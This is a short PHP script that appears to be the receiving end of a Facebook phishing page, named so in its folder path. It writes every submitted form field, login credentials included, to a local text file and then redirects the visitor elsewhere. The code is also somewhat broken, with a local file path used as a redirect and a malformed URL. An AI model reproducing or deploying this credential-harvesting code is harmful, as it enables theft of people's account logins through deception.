<?php
header
('location:C:\Users\botond\Documents\programozás\phising\facebook phising');
$handle=fopen("C:\Users\botond\Documents\programozás\phising\facebook phising\usernames.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:http://www.baby,s.com");
exit;
?>
